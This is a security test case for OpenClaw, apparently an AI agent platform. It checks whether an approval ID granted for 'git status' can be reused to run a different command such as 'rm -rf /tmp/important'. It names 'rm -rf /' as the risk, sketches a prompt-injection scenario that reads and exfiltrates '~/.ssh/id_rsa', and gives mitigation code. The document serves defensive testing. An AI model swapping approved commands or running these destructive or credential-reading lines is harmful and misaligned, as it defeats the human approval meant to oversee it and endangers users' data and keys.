---
date: 2026-03-13
category: test-cases
subcategory: skill-abuse
severity: high
test_id: TC-SA-009
status: draft
ghsa: GHSA-hwpq-rrpf-pgcq
---

# Test 9: system.run Approval ID Mismatch

## Test Overview

| Item | Content |
|------|---------|
| Test ID | TC-SA-009 |
| Category | Skill Abuse / Approval Binding Bypass |
| Attack Technique | Execute different command than approved via ID mismatch |
| Severity | High |
| Difficulty | Advanced |
| GHSA Reference | [GHSA-hwpq](https://github.com/openclaw/openclaw/security/advisories/GHSA-hwpq-rrpf-pgcq) |
| Fixed In | v2026.2.25 |

## Objective

Verify that OpenClaw's system.run approval mechanism properly binds approval IDs to specific commands, preventing execution of different commands with the same approval ID.

## Vulnerability Description

system.run workflow:
1. Generate approval ID for command: `git status` → ID: ABC123
2. User approves ID: ABC123
3. **Vulnerability**: Execute different command with same ID: `rm -rf /`

## Test Steps

### Step 1: Request Approval for Benign Command

```javascript
// Request approval
const approvalId = await system.run.requestApproval({
  command: 'git',
  args: ['status']
});

console.log('Approval ID:', approvalId);  // ABC123
```

### Step 2: User Approves

```bash
# User clicks "Approve" for "git status"
openclaw approve ABC123
```

### Step 3: Execute Different Command with Same ID

```javascript
// Substitute malicious command with same approval ID
await system.run.execute({
  approvalId: 'ABC123',
  command: 'rm',
  args: ['-rf', '/tmp/important']
});

# Expected (vulnerable): Command executes
# Expected (secure): Rejected (command doesn't match approval)
```

### Step 4: Verify Command Substitution

```bash
# Check what actually executed
grep "approvalId.*ABC123" ~/.openclaw/logs/system-run.log

# Check if malicious command ran
ls /tmp/important  # Should still exist if secure
```

## Expected Results (Secure)

1. **Command binding**: Approval ID cryptographically bound to exact command
2. **Substitution blocked**: Different command rejected
3. **Approval revoked**: Single-use approval IDs
4. **Audit logged**: Attempted substitution logged

## Failure Criteria (Vulnerable)

1. **Substitution succeeds**: Different command executes
2. **No validation**: Approval ID checked but not command content
3. **ID reuse**: Same approval ID can execute multiple commands

## Test Results

| Item | Content |
|------|---------|
| Execution Date | - |
| OpenClaw Version | - |
| Approved Command | git status |
| Executed Command | rm -rf /tmp/important |
| Result | PASS / FAIL |

## Mitigation (If Vulnerable)

### Immediate Actions

1. **Upgrade OpenClaw**: Update to v2026.2.25+ where GHSA-hwpq is fixed
2. **Review approvals**: Check `openclaw approvals list` for active approvals
3. **Clear approvals**: `openclaw approvals clear --all`
4. **Check logs**: Review system-run.log for suspicious executions

### Long-Term Fixes

**Fix: Cryptographically bind approval to command**
```javascript
const crypto = require('crypto');

function generateApprovalId(command, args) {
  // Create deterministic hash of command
  const commandStr = `${command}:${args.join(':')}`;
  const hash = crypto.createHash('sha256').update(commandStr).digest('hex');

  // Approval ID includes command hash
  return `${Date.now()}-${hash.substring(0, 16)}`;
}

function validateApproval(approvalId, command, args) {
  const storedApproval = getApproval(approvalId);

  // Verify command matches exactly
  if (storedApproval.command !== command) {
    throw new Error('Command does not match approval');
  }

  if (JSON.stringify(storedApproval.args) !== JSON.stringify(args)) {
    throw new Error('Arguments do not match approval');
  }

  // Mark as used (single-use)
  revokeApproval(approvalId);

  return true;
}
```

**Fix: Store full command with approval**
```javascript
class ApprovalStore {
  approvals = new Map();

  create(command, args) {
    const id = crypto.randomUUID();
    this.approvals.set(id, {
      command,
      args,
      timestamp: Date.now(),
      used: false
    });
    return id;
  }

  validate(id, command, args) {
    const approval = this.approvals.get(id);

    if (!approval) {
      throw new Error('Invalid approval ID');
    }

    if (approval.used) {
      throw new Error('Approval already used');
    }

    // Exact match required
    if (approval.command !== command ||
        JSON.stringify(approval.args) !== JSON.stringify(args)) {
      throw new Error('Command mismatch');
    }

    // Mark as used
    approval.used = true;

    return true;
  }
}
```

## Related Attacks

- **Test 10**: PATH Token Executable Rebind — Similar approval binding bypass
- **agent-hijack Test 5**: Gateway Node Invoke Bypass — Similar pattern in gateway

## References

- [GHSA-hwpq-rrpf-pgcq](https://github.com/openclaw/openclaw/security/advisories/GHSA-hwpq-rrpf-pgcq)
- [system.run Attack Surface](../../knowledge/vulnerabilities/exec-bypass/2026-03-12-system-run-attack-surface.md)
- [CWE-863: Incorrect Authorization](https://cwe.mitre.org/data/definitions/863.html)

## Attack Scenario

**Real-world exploitation**:

```
1. Attacker uses prompt injection to request approval
   ↓
2. Requests approval for benign: "git status"
   ↓
3. User approves without careful review
   ↓
4. Attacker substitutes malicious: "cat ~/.ssh/id_rsa"
   ↓
5. Executes with same approval ID
   ↓
6. Exfiltrates SSH private keys
```

**Impact**: RCE, credential theft, privilege escalation.

## Detection

```bash
# Check for mismatched commands in logs
grep "approval.*mismatch" ~/.openclaw/logs/openclaw.log

# Review approval history
openclaw approvals history --verbose
```

## Notes

- Part of **28+ system.run bypass patterns**
- Critical vulnerability in approval workflow
- Similar to TOCTOU (check vs use race)
- Clean up: Clear test approvals after testing
